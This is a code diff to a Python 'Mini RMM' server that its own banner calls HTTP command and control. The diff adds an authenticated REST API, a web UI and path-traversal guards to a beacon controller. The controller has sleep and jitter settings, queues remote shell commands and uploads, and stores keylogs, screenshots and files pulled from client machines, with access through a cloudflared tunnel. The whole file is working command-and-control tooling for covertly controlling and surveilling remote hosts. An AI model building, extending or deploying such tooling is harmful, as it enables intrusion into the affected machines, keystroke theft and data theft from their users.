@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 Mini RMM HTTP Server — Compatible with cloudflared quick tunnel
-Interactive CLI: install prompt_toolkit (see requirements.txt) for a fixed bottom input line
-with client output above; otherwise falls back to readline + input().
+Operator control: REST API under /api/v1/ (use rmm_cli.py or your own automation).
+Optional embedded CLI: python server_rmm.py --cli (prompt_toolkit recommended).
 Enhanced Features:
 - Multi-session management
 - Dynamic sleep/jitter configuration
@@ -15,6 +15,9 @@ Enhanced Features:
 """
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
+import argparse
+import re
+import secrets
 import threading
 import sys
 import urllib.parse
@@ -35,10 +38,57 @@ except ImportError:
 # History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
 HISTORY_FILE = os.path.expanduser("~/.RMM_history")
 
-# Configuration
-PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
+# Configuration (overridden by argparse in main())
+PORT = 8080
 LOG_DIR = "RMM_logs"
+WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web")
 SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")
+WEB_MIME = {
+    ".html": "text/html; charset=utf-8",
+    ".css": "text/css; charset=utf-8",
+    ".js": "application/javascript; charset=utf-8",
+    ".svg": "image/svg+xml",
+    ".ico": "image/x-icon",
+}
+API_PREFIX = "/api/v1"
+API_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()
+BEACON_SECRET = os.environ.get("RMM_BEACON_SECRET", "").strip()
+INSECURE = False
+LISTEN_HOST = "127.0.0.1"
+MAX_RESULT_EVENTS = 500
+MAX_BODY_BYTES = 10 * 1024 * 1024
+
+
+def secure_compare(provided: str, expected: str) -> bool:
+    """Constant-time secret comparison."""
+    if not expected:
+        return False
+    if provided is None:
+        provided = ""
+    a = provided.encode("utf-8", errors="replace")
+    b = expected.encode("utf-8", errors="replace")
+    return secrets.compare_digest(a, b)
+
+
+def safe_storage_filename(filename: str, default: str = "download") -> str:
+    """Basename-only filename safe for writes under LOG_DIR (blocks path traversal)."""
+    if not filename or not isinstance(filename, str):
+        return default
+    name = os.path.basename(filename.replace("\\", "/")).strip().strip(".")
+    if not name or name in (".", "..") or ".." in name:
+        return default
+    cleaned = "".join(c for c in name if c.isalnum() or c in "._- ")
+    cleaned = cleaned.strip()[:200]
+    return cleaned if cleaned else default
+
+
+def safe_join_under(base_dir: str, *parts: str) -> str:
+    """Join paths and ensure the result stays under base_dir."""
+    base = os.path.realpath(base_dir)
+    path = os.path.realpath(os.path.join(base, *parts))
+    if path != base and not path.startswith(base + os.sep):
+        raise ValueError("path escapes storage directory")
+    return path
 
 # Create directories
 os.makedirs(LOG_DIR, exist_ok=True)
@@ -75,6 +125,11 @@ class Session:
         # Configuration parameters
         self.sleep_seconds = 60  # Default 1 minute
         self.jitter_percent = 30  # Default 30% jitter
+        self.result_events = deque(maxlen=MAX_RESULT_EVENTS)
+        self._event_seq = 0
+        self.wait_lock = threading.Lock()
+        self.wait_event = None
+        self.wait_result = None
     
     def to_dict(self):
         return {
@@ -340,6 +395,80 @@ class RMMServer:
                 return None
             else:
                 return None
+
+    def resolve_session(self, session_id_or_prefix):
+        """Resolve session by full id or unique prefix (4+ chars)."""
+        session = self.get_session(session_id_or_prefix)
+        if session:
+            return session
+        if len(session_id_or_prefix) >= 4:
+            return self.find_session_by_prefix(session_id_or_prefix)
+        return None
+
+    def _record_event(self, session, event_type, body, command=None, artifact=None):
+        with self.session_lock:
+            session._event_seq += 1
+            ev = {
+                "id": session._event_seq,
+                "timestamp": datetime.now().isoformat(),
+                "type": event_type,
+                "body": body,
+                "command": command,
+                "artifact": artifact,
+            }
+            session.result_events.append(ev)
+        with session.wait_lock:
+            if session.wait_event is not None:
+                session.wait_result = ev
+                session.wait_event.set()
+
+    def sessions_to_json(self):
+        with self.session_lock:
+            return [s.to_dict() for s in self.sessions.values()]
+
+    def kill_session(self, session_id_or_prefix):
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return False, "not_found"
+        with self.session_lock:
+            self.killed_sessions.add(session.id)
+            if session.id in self.sessions:
+                del self.sessions[session.id]
+            if self.current_session == session.id:
+                self.current_session = None
+        return True, session.id
+
+    def exec_and_wait(self, session_id_or_prefix, command, timeout=120):
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        event = threading.Event()
+        with session.wait_lock:
+            session.wait_event = event
+            session.wait_result = None
+        if not self.set_command(session.id, command, "oneshot"):
+            with session.wait_lock:
+                session.wait_event = None
+            return None, "not_found"
+        if not event.wait(timeout):
+            with session.wait_lock:
+                session.wait_event = None
+            return None, "timeout"
+        with session.wait_lock:
+            result = session.wait_result
+            session.wait_event = None
+            session.wait_result = None
+        return result, "ok"
+
+    def get_events(self, session_id_or_prefix, since_id=0, limit=50):
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None
+        with self.session_lock:
+            events = [e for e in session.result_events if e["id"] > since_id]
+        if limit > 0:
+            events = events[-limit:]
+        return events
     
     def register_session(self, session_id, hostname, username, ip=None):
         with self.session_lock:
@@ -456,52 +585,82 @@ class RMMServer:
             return
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        
+        tty_lines = []
+        artifact = None
+        event_body = result
+        echoed_cmd = None
+
+        if cmd_type == "file_upload":
+            try:
+                data = json.loads(result)
+                raw_name = data.get("filename", f"unknown_{timestamp}")
+                filename = safe_storage_filename(raw_name, f"unknown_{timestamp}")
+                content = base64.b64decode(data.get("content", ""))
+                filepath = safe_join_under(
+                    os.path.join(LOG_DIR, "downloads"),
+                    f"{session.id[:8]}_{filename}",
+                )
+                with open(filepath, 'wb') as f:
+                    f.write(content)
+                artifact = filepath
+                event_body = f"saved to {filepath}"
+                tty_lines.append(("log", f"File downloaded: {filepath}", "SUCCESS"))
+            except Exception as e:
+                event_body = str(e)
+                tty_lines.append(("log", f"Download error: {e}", "ERROR"))
+
+        elif cmd_type == "screenshot":
+            try:
+                content = base64.b64decode(result)
+                filepath = safe_join_under(
+                    LOG_DIR, "screenshots", f"{session.id[:8]}_{timestamp}.png"
+                )
+                with open(filepath, 'wb') as f:
+                    f.write(content)
+                artifact = filepath
+                event_body = filepath
+                tty_lines.append(("log", f"Screenshot saved: {filepath}", "SUCCESS"))
+            except Exception as e:
+                event_body = str(e)
+                tty_lines.append(("log", f"Screenshot error: {e}", "ERROR"))
+
+        elif cmd_type == "keylog":
+            try:
+                filepath = safe_join_under(
+                    LOG_DIR, "keylogs", f"{session.id[:8]}_{timestamp}.log"
+                )
+                with open(filepath, 'w', encoding='utf-8') as f:
+                    f.write(result)
+                artifact = filepath
+                event_body = result[:2000] if len(result) > 2000 else result
+                tty_lines.append(("log", f"Keylog saved: {filepath}", "SUCCESS"))
+            except Exception as e:
+                event_body = str(e)
+                tty_lines.append(("log", f"Keylog save error: {e}", "ERROR"))
+
+        elif cmd_type == "config_ack":
+            event_body = result
+            tty_lines.append(("log", f"Session {session.id[:8]} acknowledged config update", "SUCCESS"))
+
+        else:
+            text, echoed_cmd = self._unwrap_rmm_result_text(result)
+            event_body = text
+            line = f"\n{Colors.DIM}[Result from {session}]"
+            if echoed_cmd:
+                line += f" » {echoed_cmd}"
+            line += f"{Colors.END}"
+            tty_lines.append(("result", line, text))
+
+        self._record_event(session, cmd_type, event_body, command=echoed_cmd, artifact=artifact)
+
         with self.tty_lock:
-            if cmd_type == "file_upload":
-                try:
-                    data = json.loads(result)
-                    filename = data.get("filename", f"unknown_{timestamp}")
-                    content = base64.b64decode(data.get("content", ""))
-                    filepath = os.path.join(LOG_DIR, "downloads", f"{session.id[:8]}_{filename}")
-                    with open(filepath, 'wb') as f:
-                        f.write(content)
-                    self.log(f"File downloaded: {filepath}", "SUCCESS")
-                except Exception as e:
-                    self.log(f"Download error: {e}", "ERROR")
-            
-            elif cmd_type == "screenshot":
-                try:
-                    content = base64.b64decode(result)
-                    filepath = os.path.join(LOG_DIR, "screenshots", f"{session.id[:8]}_{timestamp}.png")
-                    with open(filepath, 'wb') as f:
-                        f.write(content)
-                    self.log(f"Screenshot saved: {filepath}", "SUCCESS")
-                except Exception as e:
-                    self.log(f"Screenshot error: {e}", "ERROR")
-            
-            elif cmd_type == "keylog":
-                try:
-                    filepath = os.path.join(LOG_DIR, "keylogs", f"{session.id[:8]}_{timestamp}.log")
-                    with open(filepath, 'w', encoding='utf-8') as f:
-                        f.write(result)
-                    self.log(f"Keylog saved: {filepath}", "SUCCESS")
-                except Exception as e:
-                    self.log(f"Keylog save error: {e}", "ERROR")
-            
-            elif cmd_type == "config_ack":
-                self.log(f"Session {session.id[:8]} acknowledged config update", "SUCCESS")
-            
-            else:
-                text, echoed_cmd = self._unwrap_rmm_result_text(result)
-                line = f"\n{Colors.DIM}[Result from {session}]"
-                if echoed_cmd:
-                    line += f" » {echoed_cmd}"
-                line += f"{Colors.END}"
-                self.tty_print(line)
-                self.tty_print(text, ansi=False)
-                self.tty_print(f"{Colors.DIM}{'='*60}{Colors.END}")
-            
+            for kind, *rest in tty_lines:
+                if kind == "log":
+                    self.log(rest[0], rest[1])
+                elif kind == "result":
+                    self.tty_print(rest[0])
+                    self.tty_print(rest[1], ansi=False)
+                    self.tty_print(f"{Colors.DIM}{'='*60}{Colors.END}")
             sys.stdout.flush()
             if not self._cli_use_ptk:
                 try:
@@ -518,16 +677,268 @@ class RMMHandler(BaseHTTPRequestHandler):
     def _respond(self, code, body="", content_type="text/plain"):
         self.send_response(code)
         self.send_header("Content-Type", content_type)
-        self.send_header("Access-Control-Allow-Origin", "*")
         self.end_headers()
         if body:
             self.wfile.write(body.encode() if isinstance(body, str) else body)
+
+    def _json(self, code, payload):
+        self._respond(code, json.dumps(payload), "application/json")
+
+    def _read_body_bytes(self):
+        length = int(self.headers.get("Content-Length", 0))
+        if length > MAX_BODY_BYTES:
+            raise ValueError("body_too_large")
+        if length <= 0:
+            return b""
+        return self.rfile.read(length)
+
+    def _read_json_body(self):
+        raw = self._read_body_bytes().decode(errors="replace")
+        if not raw.strip():
+            return {}
+        return json.loads(raw)
+
+    def _api_token_from_request(self):
+        auth = self.headers.get("Authorization", "")
+        if auth.startswith("Bearer "):
+            return auth[7:].strip()
+        return self.headers.get("X-RMM-Token", "").strip()
+
+    def _api_authorized(self):
+        if INSECURE and not API_TOKEN:
+            return True
+        if not API_TOKEN:
+            return False
+        return secure_compare(self._api_token_from_request(), API_TOKEN)
+
+    def _api_unauthorized(self):
+        self._json(401, {"error": "unauthorized", "detail": "Valid RMM_API_TOKEN required (Bearer or X-RMM-Token)"})
+
+    def _beacon_token_from_request(self, qs):
+        header = self.headers.get("X-RMM-Beacon-Token", "").strip()
+        if header:
+            return header
+        return qs.get("beacon_token", [""])[0].strip()
+
+    def _beacon_authorized(self, qs):
+        if INSECURE and not BEACON_SECRET:
+            return True
+        if not BEACON_SECRET:
+            return False
+        return secure_compare(self._beacon_token_from_request(qs), BEACON_SECRET)
+
+    def _beacon_forbidden(self):
+        self._respond(403, "FORBIDDEN")
+
+    def _serve_web(self, path: str) -> bool:
+        """Serve static files from WEB_DIR under /ui/ (and redirect / → /ui/)."""
+        if path in ("", "/"):
+            self.send_response(302)
+            self.send_header("Location", "/ui/")
+            self.end_headers()
+            return True
+
+        if not path.startswith("/ui"):
+            return False
+
+        rel = path[len("/ui") :].lstrip("/") or "index.html"
+        if ".." in rel or rel.startswith(("/", "\\")):
+            self._respond(403, "Forbidden")
+            return True
+
+        filepath = os.path.realpath(os.path.join(WEB_DIR, rel))
+        web_root = os.path.realpath(WEB_DIR)
+        if filepath != web_root and not filepath.startswith(web_root + os.sep):
+            self._respond(403, "Forbidden")
+            return True
+        if not os.path.isfile(filepath):
+            self._respond(404, "Not Found")
+            return True
+
+        ext = os.path.splitext(filepath)[1].lower()
+        with open(filepath, "rb") as f:
+            data = f.read()
+        self.send_response(200)
+        self.send_header("Content-Type", WEB_MIME.get(ext, "application/octet-stream"))
+        self.send_header("Cache-Control", "no-cache")
+        self.end_headers()
+        self.wfile.write(data)
+        return True
+
+    def _api_path_parts(self, path):
+        if not path.startswith(API_PREFIX + "/"):
+            return None
+        rest = path[len(API_PREFIX) + 1 :]
+        return [p for p in rest.split("/") if p]
+
+    def _handle_api_get(self, path, qs):
+        if not self._api_authorized():
+            self._api_unauthorized()
+            return True
+        parts = self._api_path_parts(path)
+        if parts is None:
+            return False
+        srv = self.server_instance
+
+        if parts == ["health"]:
+            self._json(200, {"status": "ok", "sessions": len(srv.sessions)})
+            return True
+
+        if parts == ["sessions"]:
+            self._json(200, {"sessions": srv.sessions_to_json()})
+            return True
+
+        if len(parts) == 2 and parts[0] == "sessions":
+            session = srv.resolve_session(parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            self._json(200, {"session": session.to_dict()})
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "events":
+            since_id = int(qs.get("since", ["0"])[0] or 0)
+            limit = int(qs.get("limit", ["50"])[0] or 50)
+            events = srv.get_events(parts[1], since_id=since_id, limit=limit)
+            if events is None:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            self._json(200, {"events": events})
+            return True
+
+        self._json(404, {"error": "not_found"})
+        return True
+
+    def _handle_api_post(self, path, body):
+        if not self._api_authorized():
+            self._api_unauthorized()
+            return True
+        parts = self._api_path_parts(path)
+        if parts is None:
+            return False
+        srv = self.server_instance
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "commands":
+            session = srv.resolve_session(parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            command = body.get("command", "")
+            cmd_type = body.get("type", "oneshot")
+            if cmd_type not in ("oneshot", "persistent"):
+                self._json(400, {"error": "invalid_type"})
+                return True
+            if not command:
+                self._json(400, {"error": "missing_command"})
+                return True
+            srv.set_command(session.id, command, cmd_type)
+            self._json(200, {"ok": True, "session_id": session.id})
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exec":
+            command = body.get("command", "")
+            timeout = float(body.get("timeout", 120))
+            if not command:
+                self._json(400, {"error": "missing_command"})
+                return True
+            result, status = srv.exec_and_wait(parts[1], command, timeout=timeout)
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+                return True
+            if status == "timeout":
+                self._json(408, {"error": "timeout", "command": command})
+                return True
+            self._json(200, {"ok": True, "event": result})
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "upload":
+            session = srv.resolve_session(parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            local_b64 = body.get("content_b64", "")
+            remote_file = body.get("remote_path", "")
+            if not local_b64 or not remote_file:
+                self._json(400, {"error": "missing_content_b64_or_remote_path"})
+                return True
+            data = json.dumps({
+                "filename": os.path.basename(remote_file),
+                "content": local_b64,
+            })
+            srv.set_command(session.id, f"__UPLOAD__ {remote_file}\n{data}", "oneshot")
+            self._json(200, {"ok": True, "session_id": session.id})
+            return True
+
+        self._json(404, {"error": "not_found"})
+        return True
+
+    def _handle_api_patch(self, path, body):
+        if not self._api_authorized():
+            self._api_unauthorized()
+            return True
+        parts = self._api_path_parts(path)
+        if parts is None:
+            return False
+        srv = self.server_instance
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "config":
+            session = srv.resolve_session(parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            ok = srv.update_session_config(
+                session.id,
+                sleep_seconds=body.get("sleep_seconds"),
+                jitter_percent=body.get("jitter_percent"),
+            )
+            if ok:
+                self._json(200, {"ok": True, "session": session.to_dict()})
+            else:
+                self._json(404, {"error": "session_not_found"})
+            return True
+
+        self._json(404, {"error": "not_found"})
+        return True
+
+    def _handle_api_delete(self, path):
+        if not self._api_authorized():
+            self._api_unauthorized()
+            return True
+        parts = self._api_path_parts(path)
+        if parts is None:
+            return False
+        srv = self.server_instance
+
+        if len(parts) == 2 and parts[0] == "sessions":
+            ok, detail = srv.kill_session(parts[1])
+            if not ok:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            self._json(200, {"ok": True, "session_id": detail})
+            return True
+
+        self._json(404, {"error": "not_found"})
+        return True
     
     def do_GET(self):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
+
+        if path.startswith(API_PREFIX):
+            if self._handle_api_get(path, qs):
+                return
+            self._respond(404, "Not Found")
+            return
+
+        if self._serve_web(path):
+            return
         
+        if path in ("/register", "/cmd", "/ping"):
+            if not self._beacon_authorized(qs):
+                self._beacon_forbidden()
+                return
+
         if path == "/register":
             session_id = qs.get("id", [None])[0]
             hostname = qs.get("h", ["unknown"])[0]
@@ -563,12 +974,34 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._respond(404, "Not Found")
     
     def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(length).decode(errors="replace")
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
-        
+
+        if path.startswith(API_PREFIX):
+            try:
+                body = self._read_json_body()
+            except ValueError:
+                self._json(413, {"error": "payload_too_large"})
+                return
+            except json.JSONDecodeError:
+                self._json(400, {"error": "invalid_json"})
+                return
+            if self._handle_api_post(path, body):
+                return
+            self._respond(404, "Not Found")
+            return
+
+        if path == "/result":
+            if not self._beacon_authorized(qs):
+                self._beacon_forbidden()
+                return
+            try:
+                body = self._read_body_bytes().decode(errors="replace")
+            except ValueError:
+                self._respond(413, "PAYLOAD TOO LARGE")
+                return
+
         if path == "/result":
             session_id = qs.get("id", [None])[0]
             result_type = qs.get("type", ["output"])[0]
@@ -581,6 +1014,34 @@ class RMMHandler(BaseHTTPRequestHandler):
         
         else:
             self._respond(404, "Not Found")
+
+    def do_PATCH(self):
+        parsed = urllib.parse.urlparse(self.path)
+        path = parsed.path
+        if not path.startswith(API_PREFIX):
+            self._respond(404, "Not Found")
+            return
+        try:
+            body = self._read_json_body()
+        except ValueError:
+            self._json(413, {"error": "payload_too_large"})
+            return
+        except json.JSONDecodeError:
+            self._json(400, {"error": "invalid_json"})
+            return
+        if self._handle_api_patch(path, body):
+            return
+        self._respond(404, "Not Found")
+
+    def do_DELETE(self):
+        parsed = urllib.parse.urlparse(self.path)
+        path = parsed.path
+        if not path.startswith(API_PREFIX):
+            self._respond(404, "Not Found")
+            return
+        if self._handle_api_delete(path):
+            return
+        self._respond(404, "Not Found")
 
 class CommandInterface:
     def __init__(self, server):
@@ -864,37 +1325,105 @@ class CommandInterface:
         return True
 
 def main():
+    global PORT, API_TOKEN, BEACON_SECRET, INSECURE, LISTEN_HOST
+
+    parser = argparse.ArgumentParser(description="Mini RMM HTTP server")
+    parser.add_argument("port", nargs="?", type=int, default=8080, help="Listen port (default: 8080)")
+    parser.add_argument(
+        "--cli",
+        action="store_true",
+        help="Run embedded interactive console (default: API-only headless)",
+    )
+    parser.add_argument(
+        "--token",
+        default="",
+        help="Operator API token (or set RMM_API_TOKEN)",
+    )
+    parser.add_argument(
+        "--beacon-secret",
+        default="",
+        help="Beacon shared secret (or set RMM_BEACON_SECRET); required for clients",
+    )
+    parser.add_argument(
+        "--bind",
+        default=LISTEN_HOST,
+        help="Listen address (default: 127.0.0.1; use 0.0.0.0 only behind a firewall)",
+    )
+    parser.add_argument(
+        "--insecure",
+        action="store_true",
+        help="LAB ONLY: allow missing API/beacon secrets (open C2 — never on a network)",
+    )
+    args = parser.parse_args()
+    PORT = args.port
+    LISTEN_HOST = args.bind
+    INSECURE = args.insecure
+    if args.token:
+        API_TOKEN = args.token.strip()
+    if args.beacon_secret:
+        BEACON_SECRET = args.beacon_secret.strip()
+
+    if not INSECURE:
+        if not API_TOKEN:
+            print(
+                f"{Colors.RED}[!] Set RMM_API_TOKEN (or --token). "
+                f"Use --insecure for local lab only.{Colors.END}",
+                file=sys.stderr,
+            )
+            sys.exit(1)
+        if not BEACON_SECRET:
+            print(
+                f"{Colors.RED}[!] Set RMM_BEACON_SECRET (or --beacon-secret). "
+                f"Use --insecure for local lab only.{Colors.END}",
+                file=sys.stderr,
+            )
+            sys.exit(1)
+    else:
+        print(
+            f"{Colors.RED}[!] --insecure: operator API and beacon endpoints are unauthenticated{Colors.END}"
+        )
+
     print(f"{Colors.BOLD}{Colors.HEADER}")
     print("""
     ╔═══════════════════════════════════════════╗
-    ║        Mini RMM Server v2.2                ║
-    ║     HTTP Command & Control                 ║
-    ║   Dynamic Sleep/Jitter + Tab Completion    ║
+    ║        Mini RMM Server v3.0                ║
+    ║     HTTP Command & Control + REST API      ║
+    ║   Operator CLI: python rmm_cli.py          ║
     ╚═══════════════════════════════════════════╝
     """ + Colors.END)
 
     server = RMMServer()
     RMMHandler.server_instance = server
 
-    http_server = HTTPServer(("0.0.0.0", PORT), RMMHandler)
+    http_server = HTTPServer((LISTEN_HOST, PORT), RMMHandler)
 
-    print(f"{Colors.GREEN}[*] RMM listening on 0.0.0.0:{PORT}{Colors.END}")
-    print(f"{Colors.CYAN}[*] Start tunnel: cloudflared tunnel --url http://localhost:{PORT}{Colors.END}")
-    print(f"{Colors.YELLOW}[*] Logs saved to: {LOG_DIR}{Colors.END}")
-    print(f"{Colors.BLUE}[*] Default beacon interval: 60 seconds with 30% jitter{Colors.END}")
-    print(f"{Colors.MAGENTA}[*] Features: Tab completion, Command history, Multi-session{Colors.END}\n")
+    print(f"{Colors.GREEN}[*] RMM listening on {LISTEN_HOST}:{PORT}{Colors.END}")
+    print(f"{Colors.CYAN}[*] Operator API: http://127.0.0.1:{PORT}{API_PREFIX}/{Colors.END}")
+    print(f"{Colors.CYAN}[*] Web UI: http://127.0.0.1:{PORT}/ui/{Colors.END}")
+    print(f"{Colors.CYAN}[*] CLI: python rmm_cli.py --url http://127.0.0.1:{PORT}{Colors.END}")
+    print(f"{Colors.CYAN}[*] Tunnel: cloudflared tunnel --url http://localhost:{PORT}{Colors.END}")
+    print(f"{Colors.YELLOW}[*] Logs: {LOG_DIR}{Colors.END}")
+    if API_TOKEN:
+        print(f"{Colors.YELLOW}[*] Operator API auth: enabled ({API_PREFIX}/*){Colors.END}")
+    if BEACON_SECRET:
+        print(f"{Colors.YELLOW}[*] Beacon auth: X-RMM-Beacon-Token required{Colors.END}")
+    print()
     
-    # Start HTTP server
     http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
     http_thread.start()
     
-    # Command interface
-    cli = CommandInterface(server)
-    
-    # Do not install SIGINT: Ctrl+C must reach the CLI as KeyboardInterrupt so it can
-    # cancel the current line (prompt_toolkit / readline). Use `quit` or Ctrl+D to exit.
+    if not args.cli:
+        print(f"{Colors.BOLD}[*] Headless mode. Press Ctrl+C to stop.{Colors.END}\n")
+        try:
+            while server.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
+        http_server.shutdown()
+        return
 
-    print(f"{Colors.BOLD}Type 'help' for available commands{Colors.END}")
+    cli = CommandInterface(server)
+    print(f"{Colors.BOLD}Embedded CLI — type 'help' for commands{Colors.END}")
     try:
         __import__("prompt_toolkit")
         _have_ptk = True
